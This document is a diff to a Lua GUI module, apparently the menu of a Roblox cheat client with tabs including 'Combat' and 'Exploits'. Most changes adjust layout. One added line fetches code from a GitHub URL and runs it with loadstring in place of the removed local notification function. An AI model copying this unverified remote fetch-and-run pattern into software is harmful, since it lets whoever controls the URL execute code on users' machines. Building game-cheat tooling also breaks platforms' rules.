@@ -3,6 +3,10 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 
+-- Загрузка модуля уведомлений
+local Notifications = loadstring(game:HttpGet("https://raw.githubusercontent.com/Premiumezz/bobux/main/notifications"))()
+local notificationManager = Notifications.new(game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("StarClientGui"))
+
 -- Main ClickGui Module
 local StarClientGui = {}
 StarClientGui.__index = StarClientGui
@@ -91,6 +95,7 @@ function StarClientGui.new()
     self.Tabs = {}
     self.TabButtons = {}
     self.CurrentTab = nil
+    self.Functions = {} -- Для отслеживания функций
     
     local tabNames = {"Combat", "Movement", "Visuals", "Exploits", "Utils"}
     for i, tabName in ipairs(tabNames) do
@@ -133,6 +138,7 @@ function StarClientGui.new()
         
         self.Tabs[tabName] = TabFrame
         self.TabButtons[tabName] = TabButton
+        self.Functions[tabName] = {}
         
         TabButton.MouseButton1Click:Connect(function()
             if self.CurrentTab ~= tabName then
@@ -165,9 +171,10 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
     local TabFrame = self.Tabs[tabName]
     if not TabFrame then return end
     
+    local firstFunction = #self.Functions[tabName] == 0
     local FuncFrame = Instance.new("Frame")
     FuncFrame.Size = UDim2.new(0.8, 0, 0, 50)
-    FuncFrame.Position = UDim2.new(0, 0, 0, 0)
+    FuncFrame.Position = UDim2.new(0, 0, 0, firstFunction and 10 or 0) -- Отступ 10 пикселей для первой функции
     FuncFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     FuncFrame.BorderSizePixel = 1
     FuncFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
@@ -190,7 +197,7 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
     
     local BindLabel = Instance.new("TextLabel")
     BindLabel.Size = UDim2.new(0.2, 0, 0, 20)
-    BindLabel.Position = UDim2.new(0.55, 0, 0, 5)
+    BindLabel.Position = UDim2.new(0.65, 0, 0, 5)
     BindLabel.BackgroundTransparency = 1
     BindLabel.Text = "Bind:"
     BindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -201,7 +208,7 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
     
     local BindButton = Instance.new("TextButton")
     BindButton.Size = UDim2.new(0.15, 0, 0, 20)
-    BindButton.Position = UDim2.new(0.75, 0, 0, 5)
+    BindButton.Position = UDim2.new(0.85, 0, 0, 5) -- Правый угол
     BindButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
     BindButton.Text = "None"
     BindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -247,7 +254,7 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
         TabFrame.CanvasSize = UDim2.new(0, 0, 0, TabFrame.UIListLayout.AbsoluteContentSize.Y + 10)
         if callback then
             callback(enabled)
-            self:ShowNotification(funcName, enabled)
+            notificationManager:ShowNotification(funcName, enabled)
         end
     end)
     
@@ -278,7 +285,7 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
             TabFrame.CanvasSize = UDim2.new(0, 0, 0, TabFrame.UIListLayout.AbsoluteContentSize.Y + 10)
             if callback then
                 callback(enabled)
-                self:ShowNotification(funcName, enabled)
+                notificationManager:ShowNotification(funcName, enabled)
             end
         elseif input.KeyCode == Enum.KeyCode.Delete and BindButton then
             bindKey = nil
@@ -286,6 +293,7 @@ function StarClientGui:AddFunction(tabName, funcName, callback)
         end
     end)
     
+    table.insert(self.Functions[tabName], funcName)
     return {Toggle = Toggle, BindButton = BindButton}
 end
 
@@ -293,9 +301,10 @@ function StarClientGui:AddSlider(tabName, funcName, min, max, default, callback)
     local TabFrame = self.Tabs[tabName]
     if not TabFrame then return end
     
+    local firstFunction = #self.Functions[tabName] == 0
     local SliderFrame = Instance.new("Frame")
     SliderFrame.Size = UDim2.new(0.8, 0, 0, 50)
-    SliderFrame.Position = UDim2.new(0, 0, 0, 0)
+    SliderFrame.Position = UDim2.new(0, 0, 0, firstFunction and 10 or 0) -- Отступ 10 пикселей для первой функции
     SliderFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     SliderFrame.BorderSizePixel = 1
     SliderFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
@@ -392,9 +401,10 @@ function StarClientGui:AddRGBPicker(tabName, funcName, defaultColor, callback)
     local TabFrame = self.Tabs[tabName]
     if not TabFrame then return end
     
+    local firstFunction = #self.Functions[tabName] == 0
     local RGBFrame = Instance.new("Frame")
     RGBFrame.Size = UDim2.new(0.8, 0, 0, 110)
-    RGBFrame.Position = UDim2.new(0, 0, 0, 0)
+    RGBFrame.Position = UDim2.new(0, 0, 0, firstFunction and 10 or 0) -- Отступ 10 пикселей для первой функции
     RGBFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     RGBFrame.BorderSizePixel = 1
     RGBFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
@@ -524,9 +534,10 @@ function StarClientGui:AddMultiOption(tabName, funcName, options, callback)
     local TabFrame = self.Tabs[tabName]
     if not TabFrame then return end
     
+    local firstFunction = #self.Functions[tabName] == 0
     local MultiFrame = Instance.new("Frame")
     MultiFrame.Size = UDim2.new(0.8, 0, 0, 50 + (#options - 1) * 25)
-    MultiFrame.Position = UDim2.new(0, 0, 0, 0)
+    MultiFrame.Position = UDim2.new(0, 0, 0, firstFunction and 10 or 0) -- Отступ 10 пикселей для первой функции
     MultiFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     MultiFrame.BorderSizePixel = 1
     MultiFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
@@ -590,45 +601,6 @@ end
 
 function StarClientGui:Destroy()
     self.ScreenGui:Destroy()
-end
-
-function StarClientGui:ShowNotification(funcName, enabled)
-    local notification = Instance.new("TextLabel")
-    notification.Size = UDim2.new(0, 200, 0, 50)
-    notification.Position = UDim2.new(1, -220, 1, -70) -- Право нижний угол, скрыт
-    notification.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    notification.Text = funcName .. " was "
-    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
-    notification.TextSize = 14
-    notification.Font = Enum.Font.SourceSans
-    notification.Parent = self.ScreenGui
-    notification.BorderSizePixel = 0
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 4)
-    corner.Parent = notification
-    
-    local statusText = Instance.new("TextLabel")
-    statusText.Size = UDim2.new(0, 100, 1, 0)
-    statusText.Position = UDim2.new(0.5, 0, 0, 0)
-    statusText.BackgroundTransparency = 1
-    statusText.Text = enabled and "enable" or "disable"
-    statusText.TextColor3 = enabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
-    statusText.TextSize = 14
-    statusText.Font = Enum.Font.SourceSans
-    statusText.Parent = notification
-    
-    -- Анимация появления слева направо
-    local enterTween = TweenService:Create(notification, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -220, 1, -70)})
-    enterTween:Play()
-    
-    wait(2)
-    
-    -- Анимация ухода справа налево
-    local exitTween = TweenService:Create(notification, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 20, 1, -70)})
-    exitTween:Play()
-    exitTween.Completed:Connect(function()
-        notification:Destroy()
-    end)
 end
 
 return StarClientGui
